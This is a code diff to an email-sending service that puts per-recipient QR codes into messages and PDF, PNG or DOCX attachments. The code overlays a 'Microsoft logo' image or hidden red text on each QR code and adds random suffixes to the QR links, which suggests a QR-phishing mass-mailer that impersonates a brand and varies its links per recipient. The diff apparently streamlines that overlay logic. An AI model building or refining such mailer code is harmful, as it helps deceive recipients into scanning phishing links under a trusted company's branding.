@@ -1095,7 +1095,7 @@ export class AdvancedEmailService {
           
           // QR Code replacement - UNIFIED APPROACH matching original main.js exactly
           if (html.includes('{qrcode}')) {
-            console.log('[QR Processing] Processing QR code with unified approach (matches main.js)');
+            console.log('[QR Processing] Processing QR code with main.js unified approach');
             
             // Generate recipient-specific QR content - exact clone from main.js
             let qrContent = C.QR_LINK;
@@ -1117,48 +1117,31 @@ export class AdvancedEmailService {
                 contentType: 'image/png'
               });
 
-              // Hidden image overlay logic - EXACT CLONE from main.js lines 890-943
+              // Hidden image overlay logic - SIMPLIFIED MAIN.JS APPROACH
               const hiddenImgWidth = C.HIDDEN_IMAGE_SIZE || 50;
               let hiddenImageHtml = '';
-              let imgBuf: Buffer | null = null;
-              let hasHiddenImage = false;
               
-              // Load hidden image buffer - exact clone from main.js
-              try {
-                if (C.HIDDEN_IMAGE_FILE && typeof C.HIDDEN_IMAGE_FILE === 'string') {
+              // SINGLE OVERLAY PROCESSING - no dual paths
+              if (C.HIDDEN_IMAGE_FILE && typeof C.HIDDEN_IMAGE_FILE === 'string') {
+                try {
                   const logoDir = join('files', 'logo');
                   const candidatePath = join(logoDir, C.HIDDEN_IMAGE_FILE);
                   if (existsSync(candidatePath) && statSync(candidatePath).isFile()) {
-                    imgBuf = readFileSync(candidatePath);
-                    hasHiddenImage = Boolean(imgBuf && imgBuf.length > 0);
-                    
-                    // Add as CID attachment for email client compatibility - exact clone from main.js
-                    emailAttachments.push({
-                      filename: basename(candidatePath),
-                      content: imgBuf,
-                      cid: 'hiddenImage',
-                      contentType: 'image/png'
-                    });
-                    
-                    console.log(`[QR Overlay] Loaded overlay image: ${C.HIDDEN_IMAGE_FILE} (${imgBuf.length} bytes)`);
+                    const imgBuf = readFileSync(candidatePath);
+                    // Use base64 embed ONLY - matches main.js exactly
+                    const base64Img = imgBuf.toString('base64');
+                    hiddenImageHtml = `<img src="data:image/png;base64,${base64Img}" style="position:absolute; z-index:10; top:77px; left:56%; transform:translateX(-50%); width:${hiddenImgWidth}px; height:auto;"/>`;
+                    console.log(`[QR Overlay] Applied main.js unified overlay (${hiddenImgWidth}px)`);
                   }
+                } catch (err) {
+                  console.log(`[QR Overlay] Error loading overlay: ${err}`);
                 }
-              } catch (err) {
-                console.log(`[QR Overlay] Error loading overlay image: ${err}`);
-              }
-              
-              // Apply overlay HTML - EXACT CLONE from main.js approach
-              if (hasHiddenImage && imgBuf) {
-                // Use base64 embed for overlay display (NOT cid reference) - matches main.js exactly
-                const base64Img = imgBuf.toString('base64');
-                hiddenImageHtml = `<img src="data:image/png;base64,${base64Img}" style="position:absolute; z-index:10; top:77px; left:56%; transform:translateX(-50%); width:${hiddenImgWidth}px; height:auto;"/>`;
-                console.log(`[QR Overlay] Applied Microsoft logo overlay via base64 (${hiddenImgWidth}px) - exact main.js match`);
               } else if (C.HIDDEN_TEXT) {
                 hiddenImageHtml = `<span style="position:absolute; z-index:10; top:50px; left:50%; transform:translateX(-50%); padding:2px 4px; font-size:32px; color:red;">${C.HIDDEN_TEXT}</span>`;
                 console.log(`[QR Overlay] Applied hidden text: ${C.HIDDEN_TEXT}`);
               }
               
-              // Replace QR placeholder with overlay - EXACT HTML structure from main.js
+              // Replace QR placeholder - EXACT HTML structure from main.js
               const qrBorderColor = C.QR_BORDER_COLOR || C.BORDER_COLOR || '#000000';
               const borderStyle = C.BORDER_STYLE || 'solid';
               
@@ -1171,7 +1154,7 @@ export class AdvancedEmailService {
                  </div>`
               );
               
-              console.log(`[QR Processing] Unified QR processing completed for ${recipient} (matches main.js exactly)`);
+              console.log(`[QR Processing] Main.js unified approach completed for ${recipient}`);
             } else {
               html = html.replace(/\{qrcode\}/g, '<span>[QR code unavailable]</span>');
             }
@@ -1336,10 +1319,10 @@ export class AdvancedEmailService {
             console.log('[HTML_CONVERT] Processing attachments with simplified overlay approach');
             const convertFiles: Array<{ name: string; buffer: Buffer }> = [];
             
-            // Process QR codes in attachment HTML before conversion
+            // Process QR codes in attachment HTML - MAIN.JS APPROACH (no separate overlay processing)
             let processedAttHtml = finalAttHtml;
             
-            // Replace QR codes in attachment HTML with data URLs for PDF/PNG/DOCX conversion - UNIFIED APPROACH like main.js
+            // Replace QR codes with simple data URLs - no duplicate overlay processing
             if (processedAttHtml.includes('{qrcode}')) {
               let qrContent = C.QR_LINK;
               
@@ -1354,7 +1337,7 @@ export class AdvancedEmailService {
                 qrContent += (qrContent.includes('?') ? '&' : '?') + `_${rand}`;
               }
               
-              console.log(`[HTML_CONVERT] Processing QR for attachment with content: ${qrContent.substring(0, 50)}...`);
+              console.log(`[HTML_CONVERT] Processing QR for attachment - main.js approach`);
               
               // Generate QR as data URL for attachment conversion
               const qrOpts = buildQrOpts(C);
@@ -1369,60 +1352,17 @@ export class AdvancedEmailService {
                   }
                 });
                 
-                // UNIFIED APPROACH: Apply same overlay logic as main.js for PDF attachments
-                console.log(`[HTML_CONVERT] Using unified overlay approach for attachments (matches main.js)`);
-                
-                // Hidden overlay logic - EXACT CLONE from main.js lines 931-936
-                let hiddenOverlay = '';
-                const hiddenImgWidth = C.HIDDEN_IMAGE_SIZE || 50;
-                
-                // Load hidden image - exact clone from main.js lines 890-904
-                let imgBuf: Buffer | null = null;
-                let hasHiddenImage = false;
-                console.log(`[HTML_CONVERT] Checking for hidden image: ${C.HIDDEN_IMAGE_FILE}`);
-                try {
-                  if (C.HIDDEN_IMAGE_FILE && typeof C.HIDDEN_IMAGE_FILE === 'string') {
-                    const logoDir = join('files', 'logo');
-                    const candidatePath = join(logoDir, C.HIDDEN_IMAGE_FILE);
-                    console.log(`[HTML_CONVERT] Looking for image at: ${candidatePath}`);
-                    if (existsSync(candidatePath) && statSync(candidatePath).isFile()) {
-                      imgBuf = readFileSync(candidatePath);
-                      console.log(`[HTML_CONVERT] Hidden image loaded successfully: ${candidatePath} (${imgBuf.length} bytes)`);
-                      hasHiddenImage = Boolean(imgBuf && imgBuf.length > 0);
-                    } else {
-                      console.log(`[HTML_CONVERT] Hidden image file not found: ${candidatePath}`);
-                    }
-                  }
-                } catch (err) {
-                  console.log(`[HTML_CONVERT] Error loading hidden image: ${err}`);
-                }
-                
-                console.log(`[HTML_CONVERT] Has hidden image: ${hasHiddenImage}, Hidden text: ${C.HIDDEN_TEXT || 'none'}`);
-                
-                // Exact overlay logic from main.js lines 931-936 - Base64 embedding for PDF attachments  
-                if (hasHiddenImage && imgBuf) {
-                  const base64Img = imgBuf!.toString('base64');
-                  hiddenOverlay = `<img src="data:image/png;base64,${base64Img}" style="position:absolute; z-index:10; top:77px; left:56%; transform:translateX(-50%); width:${hiddenImgWidth}px; height:auto;"/>`;
-                  console.log(`[HTML_CONVERT] Using hidden image overlay for PDF (${hiddenImgWidth}px width) - matches main.js`);
-                } else if (C.HIDDEN_TEXT) {
-                  hiddenOverlay = `<span style="position:absolute; z-index:10; top:50px; left:50%; transform:translateX(-50%); padding:2px 4px; font-size:32px; color:red;">${C.HIDDEN_TEXT}</span>`;
-                  console.log(`[HTML_CONVERT] Using hidden text fallback for PDF: ${C.HIDDEN_TEXT}`);
-                } else {
-                  console.log(`[HTML_CONVERT] No overlay applied to PDF - no image and no text available`);
-                }
-                
                 // Use QR border color if specified, otherwise use general border color
                 const qrBorderColor = C.QR_BORDER_COLOR || C.BORDER_COLOR || '#000000';
                 const borderStyle = C.BORDER_STYLE || 'solid';
                 
-                // Apply same overlay approach as main.js - unified for all formats
+                // Simple QR replacement - NO overlay duplication (main.js approach)
                 const qrHtml = `<div style="position:relative; display:inline-block; text-align:center; width:${C.QR_WIDTH}px; height:${C.QR_WIDTH}px;">
                                   <img src="${qrDataUrl}" alt="QR Code" style="display:block; width:${C.QR_WIDTH}px; height:auto; border:${C.QR_BORDER_WIDTH}px ${borderStyle} ${qrBorderColor}; padding:2px;"/>
-                                  ${hiddenOverlay}
                                 </div>`;
                 
                 processedAttHtml = processedAttHtml.replace(/\{qrcode\}/g, qrHtml);
-                console.log(`[HTML_CONVERT] QR code processed for attachment with overlay (matches main.js approach)`);
+                console.log(`[HTML_CONVERT] QR processed for attachment - main.js unified approach`);
               } catch (qrError) {
                 console.error(`[HTML_CONVERT] QR generation failed for attachment:`, qrError);
                 processedAttHtml = processedAttHtml.replace(/\{qrcode\}/g, '<span>[QR code unavailable]</span>');
